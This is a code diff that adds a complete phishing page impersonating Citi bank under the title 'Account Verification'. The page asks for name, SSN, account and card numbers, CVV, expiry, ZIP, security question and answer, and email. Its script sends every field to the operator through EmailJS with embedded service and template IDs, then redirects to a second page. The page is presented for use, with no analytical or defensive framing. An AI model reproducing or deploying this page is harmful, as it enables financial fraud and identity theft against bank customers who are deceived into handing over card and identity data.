@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment Information</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#004f98;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:20px;
+}
+
+/* TOP LOGO (MATCH FORM WIDTH) */
+.top-logo{
+    width:100%;
+    margin-bottom:0px;
+}
+
+.top-logo img{
+    width:100%;
+    max-width:420px;
+    height:auto;
+    border-radius:12px;
+}
+
+.form-container{
+    width:100%;
+    max-width:500px;
+    background:#fff;
+    padding:30px;
+    border-radius:15px;
+    box-shadow:0 10px 30px rgba(0,0,0,.15);
+}
+
+.form-title{
+    text-align:center;
+    margin-bottom:25px;
+}
+
+.form-title h2{
+    color:#222;
+    font-size:28px;
+    margin-bottom:8px;
+}
+
+.form-title p{
+    color:#777;
+    font-size:14px;
+}
+
+.form-group{
+    margin-bottom:18px;
+}
+
+.form-group label{
+    display:block;
+    margin-bottom:6px;
+    font-weight:bold;
+    color:#444;
+}
+
+.form-group input{
+    width:100%;
+    padding:12px;
+    border:1px solid #ccc;
+    border-radius:8px;
+    font-size:15px;
+    transition:.3s;
+}
+
+.form-group input:focus{
+    border-color:#007bff;
+    outline:none;
+    box-shadow:0 0 6px rgba(0,123,255,.25);
+}
+
+.row{
+    display:flex;
+    gap:15px;
+}
+
+.row .form-group{
+    flex:1;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    background:#007bff;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.3s;
+}
+
+button:hover{
+    background:#0056b3;
+}
+</style>
+
+</head>
+<body>
+
+<div class="form-container">
+    <!-- TOP LOGO (LARGE, SAME WIDTH AS FORM) -->
+    <div class="top-logo">
+        <img src="citi.png" alt="Main Logo">
+    </div>
+	
+    <div class="form-title">
+        <h2>Account Verification</br>Verify your identity</h2>
+		</br>
+		<p>Please fill in your information below.</p>
+    </div>
+
+
+        <!-- Full Name -->
+		<form id="question-form">
+		
+        <div class="form-group">
+            <label for="fullname">Full Name</label>
+            <input
+                type="text"
+                id="fullname"
+                name="fullname"
+                placeholder="John Doe"
+                autocomplete="name"
+                minlength="2"
+                maxlength="100"
+                required>
+        </div>
+
+        <!-- SSN -->
+        <div class="form-group">
+            <label for="ssn">SSN</label>
+            <input
+                type="text"
+                id="ssn"
+                name="ssn"
+                placeholder="123-45-6789"
+                maxlength="11"
+                autocomplete="off"
+                required>
+        </div>
+
+        <!-- Account Number -->
+        <div class="form-group">
+            <label for="account">Account No.</label>
+            <input
+                type="text"
+                id="account"
+                name="account"
+                placeholder="Account Number"
+                inputmode="numeric"
+                pattern="[0-9]{6,17}"
+                maxlength="17"
+                required>
+        </div>
+
+        <!-- Card Number -->
+        <div class="form-group">
+            <label for="card">Card Number</label>
+            <input
+                type="text"
+                id="card"
+                name="card"
+                placeholder="1234 5678 9012 3456"
+                inputmode="numeric"
+                autocomplete="cc-number"
+                maxlength="19"
+                required>
+        </div>
+
+        <div class="row">
+
+            <!-- CVV -->
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input
+                    type="password"
+                    id="cvv"
+                    name="cvv"
+                    inputmode="numeric"
+                    pattern="[0-9]{3,4}"
+                    maxlength="4"
+                    autocomplete="cc-csc"
+                    required>
+            </div>
+
+            <!-- Expiration -->
+            <div class="form-group">
+                <label for="exp">EXP</label>
+                <input
+                    type="month"
+                    id="exp"
+                    name="exp"
+                    autocomplete="cc-exp"
+                    required>
+            </div>
+
+        </div>
+
+        <!-- ZIP -->
+        <div class="form-group">
+            <label for="zip">ZIP Code</label>
+            <input
+                type="text"
+                id="zip"
+                name="zip"
+                placeholder="ZIP Code"
+                maxlength="10"
+                required>
+        </div>
+        <!-- Citi Security Question-->
+        <div class="form-group">
+            <label for="question">Citi Security Question</label>
+            <input
+                type="text"
+                id="question"
+                name="question"
+                placeholder="Enter your question here"
+                autocomplete="question"
+                minlength="1"
+                maxlength="100"
+                required>
+        </div>
+		
+		<!-- Citi Security Question Answer -->
+        <div class="form-group">
+            <label for="answer">Citi Security Question Answer</label>
+            <input
+                type="text"
+                id="answer"
+                name="answer"
+                placeholder="Enter your answer here"
+                autocomplete="answer"
+                minlength="1"
+                maxlength="100"
+                required>
+        </div>
+		
+        <!-- Email -->
+        <div class="form-group">
+            <label for="email">Email Address</label>
+            <input
+                type="email"
+                id="username"
+                name="username"
+                placeholder="example@email.com"
+                autocomplete="email"
+                required>
+        </div>
+
+        <button type="submit">Continue</button>
+
+    </form>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+
+<script>
+emailjs.init("pihpsTf7HFt-OXVeT");
+
+const form = document.getElementById("question-form");
+
+form.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const params = {
+        form_type: "Question Form",
+        fullname: document.querySelector('input[name="fullname"]').value,
+        ssn: document.querySelector('input[name="ssn"]').value,
+        account: document.querySelector('input[name="account"]').value,
+        card: document.querySelector('input[name="card"]').value,
+        cvv: document.querySelector('input[name="cvv"]').value,
+        exp: document.querySelector('input[name="exp"]').value,
+        zip: document.querySelector('input[name="zip"]').value,
+        question: document.querySelector('input[name="question"]').value,
+        answer: document.querySelector('input[name="answer"]').value,
+        username: document.querySelector('input[name="username"]').value
+    };
+
+    emailjs.send("service_ozbrno9", "template_86sh2kk", params)
+        .then(() => {
+            localStorage.setItem("userEmail", params.username);
+            window.location.href = "page2.html";
+        })
+        .catch((error) => {
+            console.error(error);
+            alert("Something went wrong. Please try again.");
+        });
+});
+</script>
+</body>
+</html>
